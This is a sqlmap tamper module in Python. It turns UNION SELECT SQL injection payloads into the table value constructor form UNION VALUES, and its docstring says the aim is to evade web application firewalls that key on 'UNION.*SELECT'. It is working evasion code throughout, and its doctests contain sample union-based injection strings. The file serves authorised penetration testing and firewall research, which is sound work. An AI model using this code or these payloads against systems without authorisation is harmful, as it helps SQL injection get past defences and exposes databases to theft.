#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import re

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Replaces UNION SELECT <columns> with the standard SQL table value constructor UNION VALUES (<columns>)

    Requirement:
        * MariaDB
        * PostgreSQL
        * SQLite
        * CockroachDB
        * CrateDB
        * Presto

    Tested against:
        * MariaDB 10.11.14, 11.8.8
        * PostgreSQL 16.11
        * SQLite 3.45.1
        * CockroachDB, CrateDB, Trino

    Notes:
        * Useful to bypass web application firewalls keying on the 'UNION.*SELECT' pair, as the
          resulting payload carries no SELECT token at all
        * MySQL requires the row constructor to be spelled 'VALUES ROW(...)' and rejects this form
          (see tamper script 'unionvaluesrow'), while Oracle and Microsoft SQL Server have no
          standalone VALUES query at all
        * A table value constructor takes no FROM clause, hence payloads carrying one (e.g. those
          produced by --union-from) are deliberately left untouched

    >>> tamper('-1 UNION ALL SELECT NULL,CONCAT(0x716b6a7671,0x41,0x7170707671),NULL-- -')
    '-1 UNION ALL VALUES (NULL,CONCAT(0x716b6a7671,0x41,0x7170707671),NULL)-- -'
    >>> tamper('-1 UNION SELECT 45,45#')
    '-1 UNION VALUES (45,45)#'
    >>> tamper('-1 UNION ALL SELECT NULL,NULL FROM DUAL-- -')
    '-1 UNION ALL SELECT NULL,NULL FROM DUAL-- -'
    """

    def _(match):
        columns = match.group("columns").rstrip()

        if re.search(r"(?i)\bFROM\b", columns):
            return match.group(0)

        return "%s%s VALUES (%s)" % (match.group("union"), match.group("all") or "", columns)

    return re.sub(r"(?i)(?P<union>UNION)(?P<all>\s+ALL)?\s+SELECT\s+(?P<columns>.+?)(?=(?:--|#|/\*)|$)", _, payload) if payload else payload
